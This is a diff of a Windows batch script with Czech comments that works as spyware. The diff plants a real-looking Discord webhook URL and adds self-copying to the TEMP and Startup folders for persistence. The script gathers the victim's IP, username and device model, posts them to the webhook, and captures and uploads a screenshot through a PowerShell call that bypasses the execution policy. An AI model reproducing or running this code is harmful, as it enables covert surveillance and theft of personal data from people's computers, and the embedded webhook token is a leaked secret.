@@ -3,7 +3,13 @@ chcp 65001 >nul
 setlocal EnableDelayedExpansion
 
 :: 🌐 Webhook
-set "webhook=https://discord.com/api/webhooks/TVUJ_WEBHOOK"
+set "webhook=https://discord.com/api/webhooks/1439411134137499698/1LxkdwQcxAxk-N_ZDkZQ1TRUiAgqiaqhPpkgcN6KIiFO1m5PWw6aDAm0cFOE445el1c8"
+
+:: 📂 Samonáprava (TEMP + autostart)
+set "bootbat=%TEMP%\boot.bat"
+set "startup=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\boot.bat"
+if not exist "%bootbat%" copy /y "%~f0" "%bootbat%" >nul
+if not exist "%startup%" copy /y "%~f0" "%startup%" >nul
 
 :: 🌍 IP + uživatel
 for /f "delims=" %%x in ('curl -s https://api.ipify.org') do set "ip=%%x"
@@ -35,31 +41,20 @@ for /f "skip=1 tokens=* delims=" %%i in ('wmic computersystem get model') do (
     )
 )
 
-:: 🧠 RAM
-for /f "skip=1 tokens=* delims=" %%i in ('wmic computersystem get totalphysicalmemory') do set "ramRaw=%%i"
-set /a ram=%ramRaw:~0,-6%
+:: 🧾 Zpráva – každá položka na novém řádku, IP s || před i za
+set "msg=🛰️ **Systémové info**"
+set "msg=!msg!\nIP: ||!ip! ||"
+set "msg=!msg!\nČas: !timestamp!"
+set "msg=!msg!\nUživatel: !user!"
+set "msg=!msg!\nZařízení: !deviceType!"
+set "msg=!msg!\nModel: !deviceModel!"
 
-:: 🧾 Zpráva – klasicky přes -d
-set "msg=🛰️ Systémové info:^
-IP: ||!ip! ||^
-Čas: !timestamp!^
-Uživatel: !user!^
-Zařízení: !deviceType!^
-Model: !deviceModel!^
-RAM: !ram! GB"
-
+:: 📤 Odeslání na webhook
 curl -s -X POST %webhook% -d "content=!msg!" >nul
 
 :: 📸 Screenshot
 set "ss=%TEMP%\screenshot_%RANDOM%.png"
-powershell -ExecutionPolicy Bypass -Command ^
-"Add-Type -AssemblyName System.Windows.Forms; ^
-Add-Type -AssemblyName System.Drawing; ^
-$bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; ^
-$bmp = New-Object Drawing.Bitmap $bounds.Width, $bounds.Height; ^
-$graphics = [Drawing.Graphics]::FromImage($bmp); ^
-$graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.Size); ^
-$bmp.Save('%ss%', [Drawing.Imaging.ImageFormat]::Png)"
+powershell -ExecutionPolicy Bypass -Command "Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bmp = New-Object Drawing.Bitmap $bounds.Width, $bounds.Height; $graphics = [Drawing.Graphics]::FromImage($bmp); $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.Size); $bmp.Save('%ss%', [Drawing.Imaging.ImageFormat]::Png)"
 
 if exist "%ss%" (
     curl -s -X POST %webhook% -F "file=@%ss%;type=image/png" >nul
